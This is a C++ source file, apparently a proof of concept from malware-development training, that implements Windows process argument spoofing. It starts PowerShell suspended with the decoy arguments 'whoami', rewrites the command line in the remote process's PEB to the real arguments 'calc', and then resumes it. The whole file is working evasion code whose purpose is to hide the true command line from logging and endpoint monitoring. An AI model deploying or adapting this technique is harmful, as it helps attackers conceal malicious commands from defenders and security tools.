#include <Windows.h>
#include <cstdio>
#include <wtypesbase.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI* fnNtQueryInformationProcess)(
	_In_ HANDLE ProcessHandle,
	_In_ PROCESSINFOCLASS ProcessInformationClass,
	_Out_writes_bytes_(ProcessInformationLength) PVOID ProcessInformation,
	_In_ ULONG ProcessInformationLength,
	_Out_opt_ PULONG ReturnLength
) ;
BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN DWORD dwBufferSize) {

	SIZE_T	sNmbrOfBytesRead = NULL;

	*ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);

	if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNmbrOfBytesRead) || sNmbrOfBytesRead != dwBufferSize) {
		printf("[!] ReadProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[i] Bytes Read : %d Of %d \n", sNmbrOfBytesRead, dwBufferSize);
		return FALSE;
	}

	return TRUE;
}

BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN DWORD dwBufferSize) {

	SIZE_T sNmbrOfBytesWritten = NULL;

	if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[i] Bytes Written : %d Of %d \n", sNmbrOfBytesWritten, dwBufferSize);
		return FALSE;
	}

	return TRUE;
}

BOOL CreateArgSpoofedProcess(IN LPWSTR szStartupArgs, IN LPWSTR szRealArgs, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
	NTSTATUS STATUS = NULL;
	WCHAR szProcess[MAX_PATH];

	STARTUPINFOW Si = { 0 };
	PROCESS_INFORMATION Pi = { 0 };
	PROCESS_BASIC_INFORMATION PBI = { 0 };
	ULONG uRetern = NULL;

	PPEB pPeb = NULL;
	PRTL_USER_PROCESS_PARAMETERS pParms = NULL;

	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	Si.cb = sizeof(STARTUPINFOW);

	fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess");
	if (pNtQueryInformationProcess == NULL)
		return FALSE;
	lstrcpyW(szProcess, szStartupArgs);

	if (!CreateProcessW(
		NULL,
		szProcess,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,      // creating the process suspended & with no window
		NULL,
		L"C:\\Windows\\System32\\",               // we can use GetEnvironmentVariableW to get this Programmatically
		&Si,
		&Pi)) {
		printf("\t[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}
	// Getting the PROCESS_BASIC_INFORMATION structure of the remote process which contains the PEB address
	if ((STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &uRetern)) != 0) {
		printf("\t[!] NtQueryInformationProcess Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	// Reading the PEB structure from its base address in the remote process
	if (!ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, (PVOID*)&pPeb, sizeof(PEB))) {
		printf("\t[!] Failed To Read Target's Process Peb \n");
		return FALSE;
	}
	DWORD dwNewLen = sizeof(L"powershell.exe");

	if (!WriteToTargetProcess(Pi.hProcess, ((PBYTE)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&dwNewLen, sizeof(DWORD))) {
		return FALSE;
	}
	// Reading the RTL_USER_PROCESS_PARAMETERS structure from the PEB of the remote process
	// Read an extra 0xFF bytes to ensure we have reached the CommandLine.Buffer pointer
	// 0xFF is 255 but it can be whatever you like
	if (!ReadFromTargetProcess(Pi.hProcess, pPeb->ProcessParameters, (PVOID*)&pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
		printf("\t[!] Failed To Read Target's Process ProcessParameters \n");
		return FALSE;
	}

	// Writing the real argument to the process
	if (!WriteToTargetProcess(Pi.hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)szRealArgs, (DWORD)(lstrlenW(szRealArgs) * sizeof(WCHAR) + 1))) {
		printf("\t[!] Failed To Write The Real Parameters\n");
		return FALSE;
	}


	// Cleaning up
	HeapFree(GetProcessHeap(), NULL, pPeb);
	HeapFree(GetProcessHeap(), NULL, pParms);
	
	// Resuming the process with the new paramters
	ResumeThread(Pi.hThread);

	// Saving output parameters
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;
	
	// Checking if everything is valid
	if (*dwProcessId != NULL, *hProcess != NULL && *hThread != NULL)
		return TRUE;
	return  FALSE;
}

int main() {
	wchar_t  szStartupArgs[] = L"powershell -c whoami";
	wchar_t  szRealArgs[] = L"powershell -c calc";
	DWORD dwProcessId;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;

	if (!CreateArgSpoofedProcess(szStartupArgs, szRealArgs, &dwProcessId, &hProcess, &hThread))
	{
		printf("CreateArgSpoofedProcess failed with error: %lu", GetLastError());
		return 1;
	}
	printf("processid :%lu\nprocess handle: 0x%p\nprocess thread : 0x%p", dwProcessId, hProcess, hThread);
	getchar();
	return 0;
}